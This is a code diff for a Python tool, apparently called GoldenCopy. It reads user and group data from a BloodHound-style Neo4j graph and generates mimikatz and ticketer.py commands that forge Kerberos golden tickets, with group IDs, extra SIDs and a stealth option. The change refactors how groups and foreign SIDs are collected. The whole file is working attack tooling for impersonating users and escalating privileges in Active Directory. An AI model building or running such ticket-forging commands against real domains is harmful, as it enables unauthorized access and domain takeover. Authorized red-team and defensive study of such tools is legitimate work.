@@ -1,4 +1,6 @@
 #!/usr/bin/python3
+from typing import List
+
 from py2neo import Graph
 import argparse
 import logging
@@ -75,6 +77,10 @@ class User:
         self.domain_id = '-'.join(self.object_id.split('-')[:-1])
         self.sidhistory = obj[3]
         self.type = type
+        self.groups: List[Group] = []
+
+    def __str__(self):
+        return f"{self.domain}/{self.username}"
 
 
 class Group:
@@ -82,9 +88,21 @@ class Group:
     def __init__(self, group):
         self.name = group[0]
         self.domain = group[1]
-        self.object_id = group[2]
-        self.group_id = self.object_id.split('-')[-1]
-        self.domain_id = '-'.join(self.object_id.split('-')[:-1])
+        self.object_id: str = group[2]
+        if self.object_id.startswith("S-1-5-"):
+            self.is_extra = False
+            self.group_id = self.object_id.split('-')[-1]
+            self.domain_id = '-'.join(self.object_id.split('-')[:-1])
+        else:
+            self.is_extra = True
+            self.group_id = '-'.join(self.object_id.split('-')[1:])
+            self.domain_id = self.object_id.split('-')[0]
+
+    def __str__(self):
+        return f"{self.name}: {self.domain_id}-{self.group_id}"
+
+    def __repr__(self):
+        return self.name
 
 
 def findUser(g):
@@ -143,8 +161,8 @@ def keyType():
     return "default"
 
 
-def groupList(groups):
-    total_groups = set(i.group_id for i in groups)
+def groupList(user: User):
+    total_groups = set(i.group_id for i in user.groups if not i.is_extra)
     if args.groups is not None:
         total_groups.update(args.groups.split(','))
     return ','.join(total_groups)
@@ -152,12 +170,13 @@ def groupList(groups):
 
 def extraSidList(user: User):
     total_sid = set(user.sidhistory)
+    total_sid.update(i.group_id for i in user.groups if i.is_extra)
     if args.sid is not None:
         total_sid.update(args.sid.split(','))
     return ','.join(total_sid)
 
 
-def goldenMimikatz(user, groups):
+def goldenMimikatz(user: User):
     logger.info("Creating commands for mimikatz")
 
     def getKey():
@@ -179,7 +198,7 @@ def goldenMimikatz(user, groups):
           f"/id:{user.user_id} " \
           f"/sid:{user.domain_id} " \
           f"{getKey()} " \
-          f"/groups:{groupList(groups)} " \
+          f"/groups:{groupList(user)} " \
           f"{getExtraSid(user)}" \
           f"{args.custom}"
     if args.stealth:
@@ -192,7 +211,7 @@ def goldenMimikatz(user, groups):
     return cmd
 
 
-def goldenTicketer(user, groups):
+def goldenTicketer(user: User):
     logger.info("Creating commands for ticketer")
 
     def getKey():
@@ -211,7 +230,7 @@ def goldenTicketer(user, groups):
     cmd = f"ticketer.py {getKey()} " \
           f"-domain {user.domain} " \
           f"-domain-sid {user.domain_id} " \
-          f"-groups {groupList(groups)} " \
+          f"-groups {groupList(user)} " \
           f"-user-id {user.user_id} " \
           f"{getExtraSid(user)}" \
           f"{args.custom}"
@@ -226,15 +245,15 @@ def goldenTicketer(user, groups):
     return cmd
 
 
-def forgeTicket(user, groups):
+def forgeTicket(user):
     tools = {"mimikatz": goldenMimikatz, "ticketer": goldenTicketer}
     if args.custom != "":
         args.custom += " "
     if args.tools == "all":
         for forgeFunc in tools.values():
-            forgeFunc(user, groups)
+            forgeFunc(user)
     else:
-        tools.get(args.tools)(user, groups)
+        tools.get(args.tools)(user)
 
 
 def main():
@@ -254,8 +273,8 @@ def main():
     logger.warning(f"GoldenCopy v{__version__}")
     g = getNeo4jConnection()
     user = findUser(g)
-    groups = findGroupFromObj(g, user)
-    forgeTicket(user, groups)
+    user.groups = findGroupFromObj(g, user)
+    forgeTicket(user)
 
 
 if __name__ == '__main__':
